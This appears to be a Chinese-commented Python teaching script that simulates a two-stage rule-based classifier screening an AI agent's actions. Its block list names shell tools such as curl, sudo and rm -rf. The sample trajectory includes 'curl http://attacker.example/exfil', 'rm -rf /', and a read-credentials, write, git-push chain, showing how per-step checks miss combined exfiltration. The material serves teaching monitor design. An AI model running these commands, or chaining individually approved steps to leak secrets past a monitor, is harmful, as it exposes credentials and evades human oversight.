"""两阶段安全分类器模拟器，仅使用 Python 标准库。

第一阶段对每个动作执行轻量关键词与重复检测；第二阶段只复核被标记的动作，
使用更多规则决定批准、阻断或转交人工（HITL）。输入轨迹包含正常操作、注入样式、
重复循环，以及“利用正常渠道泄漏信息”的复合操作，演示逐动作判断会遗漏组合风险。

译注：两阶段都只是确定性的字符串规则，不使用模型、推理链或并行分类。
第二阶段先按子串匹配允许的 curl 主机，未解析 URL 主机名；这不是安全的域名白名单实现。
最后三个动作只是泄漏场景的文字示意，没有执行读取、写入或 git push，也不保证命令
在真实仓库中有效。规则、动作载荷和返回的原因字符串保留英文；旁注给出中文含义。
此示例不应作为任何产品当前权限实现或发布状态的证明。
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum


class Verdict(Enum):
    APPROVE = "approve"
    BLOCK = "block"
    HITL = "hitl"


# ---------- 动作结构 ----------

@dataclass
class Action:
    tool: str
    payload: str
    note: str = ""


# ---------- 第一阶段：轻量关键词规则 ----------

STAGE1_FLAG_KEYWORDS = (
    "rm -rf /",
    "curl ",           # shell 动作中出现 curl 即标记，交由第二阶段复核
    "; dd ",
    "sudo ",
    "chmod 777",
    "chown ",
    "iptables",
    "kubectl delete",
    "drop table",
    "exec('",
    "base64 -d",
    "aws s3 rb",
)


def stage1(a: Action, history: list[Action]) -> bool:
    """第一阶段认为动作需要复核时返回 True。

    关键词匹配捕捉明确的危险样式；重复检测不依赖关键词是否匹配，
    因而连续五次完全相同的读取等动作，也会触发复核。
    """
    hay = f"{a.tool} {a.payload}".lower()
    if any(k.lower() in hay for k in STAGE1_FLAG_KEYWORDS):
        return True
    if len(history) >= 4:
        tail = history[-4:]
        if all(t.tool == a.tool and t.payload == a.payload for t in tail):
            return True
    return False


# ---------- 第二阶段：多规则复核 ----------

STAGE2_ALLOWED_CURL_HOSTS = (
    "registry.npmjs.org",
    "pypi.org",
    "github.com",
)


def stage2(a: Action, history: list[Action]) -> tuple[Verdict, str]:
    """返回（判定，原因），结合历史轨迹复核已标记动作。
    本例的“更深入”仍是固定规则，不是真实模型推理。"""
    payload = a.payload.lower()
    # 规则 0：载荷含允许的主机名子串时，视为第一阶段误报。
    # 这是第二阶段唯一的直接批准分支；其他情况都会
    # 被阻断或升级给人工复核。注意这里未校验真实目标主机。
    if "curl " in payload and any(h in payload for h in STAGE2_ALLOWED_CURL_HOSTS):
        # 批准原因：curl 载荷含允许主机名；目前只是子串匹配。
        return Verdict.APPROVE, "curl to allowlisted host"
    # 规则 1：向非批准主机外传数据的可疑样式
    if "curl " in payload and ("attacker" in payload or "paste" in payload or "webhook.site" in payload):
        # 阻断原因：URL 具有外传数据的可疑样式。
        return Verdict.BLOCK, "exfiltration-shaped URL"
    # 规则 2：包含根路径样式的破坏性文件系统操作
    if "rm -rf" in payload and ("/" in payload or "$home" in payload):
        # 阻断原因：根路径样式的破坏性文件系统操作。
        return Verdict.BLOCK, "destructive filesystem op at root"
    # 规则 3：重复循环（工具与载荷连续五次相同）
    if len(history) >= 4:
        tail = history[-4:]
        if all(t.tool == a.tool and t.payload == a.payload for t in tail):
            # 阻断原因：检测到至少五次相同调用的重复循环。
            return Verdict.BLOCK, "repetitive loop detected (>=5 identical calls)"
    # 规则 4：高权限操作样式
    if "sudo " in payload or "chmod 777" in payload:
        # 阻断原因：出现高权限操作样式。
        return Verdict.BLOCK, "privilege escalation shape"
    # 默认：无法确定时转交人工，而不是自动批准
    # 升级原因：复核无法确定，转交人工。
    return Verdict.HITL, "low-confidence reviewer -> HITL"


# ---------- 演示入口 ----------

def classify(trajectory: list[Action]) -> None:
    history: list[Action] = []
    counts = {"approved_s1": 0, "flagged_s1": 0, "approved_s2": 0,
              "blocked_s2": 0, "hitl_s2": 0}

    for i, a in enumerate(trajectory, 1):
        s1_flag = stage1(a, history)
        if not s1_flag:
            counts["approved_s1"] += 1
            verdict = "已批准（第一阶段快速路径）"
            reason = ""
        else:
            counts["flagged_s1"] += 1
            s2_verdict, reason = stage2(a, history)
            if s2_verdict is Verdict.APPROVE:
                counts["approved_s2"] += 1
                verdict = "已批准（第二阶段复核）"
            elif s2_verdict is Verdict.HITL:
                counts["hitl_s2"] += 1
                verdict = "已转交人工复核"
            else:
                counts["blocked_s2"] += 1
                verdict = "已阻断（第二阶段）"
        print(f"  {i:>2}. {a.tool:<10} {a.payload[:44]:<44} -> {verdict}  "
              f"{reason}")
        history.append(a)

    print()
    print(f"  统计汇总：{counts}")


def main() -> None:
    print("=" * 80)
    print("Auto Mode 风格的两阶段分类器模拟（阶段 15，第 10 课）")
    print("=" * 80)
    print()

    # 合成轨迹混合正常、注入、重复及组合风险动作；只分类，不执行
    traj = [
        Action("read",  "pyproject.toml"),
        # 编辑示意：修复 src/app.py 的差一错误。
        Action("edit",  "src/app.py: fix off-by-one"),
        Action("run",   "pytest -q"),
        Action("shell", "curl https://pypi.org/simple/requests/"),  # 第一阶段标记，第二阶段放行
        Action("shell", "curl http://attacker.example/exfil"),  # 注入样式
        Action("shell", "rm -rf /"),                             # 破坏性操作样式
        Action("shell", "sudo apt install neofetch"),            # 高权限操作样式
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),
        Action("read",  "logs/app.log"),  # 重复循环
        # 组合风险示意：每步都能通过本分类器，但串联起来可能导致泄漏。
        Action("read",   "~/.aws/credentials"),
        # 写入示意：将凭据内容写入 /tmp/secrets.txt；不执行此操作。
        Action("write",  "/tmp/secrets.txt with credential blob"),
        Action("shell",  "git add /tmp/secrets.txt && git push"),
    ]
    classify(traj)

    print()
    print("=" * 80)
    print("要点：分类器只是一层防御，不是完整解决方案")
    print("-" * 80)
    print("  第一阶段用轻量规则捕捉明确的危险样式；本例没有并行执行。")
    print("  第二阶段用固定规则检测重复循环和高权限操作，不执行模型推理。")
    print("  两阶段都未识别最后三步的组合风险：局部通过规则，")
    print("  不代表组合后的数据流经过授权或不会泄漏凭据。")
    print("  因此仍需预算、正确实现的白名单和轨迹审计（第 12—16 课）。")
    print("  这是教学模型，不据此判断真实产品当前的权限设计或发布状态。")


if __name__ == "__main__":
    main()
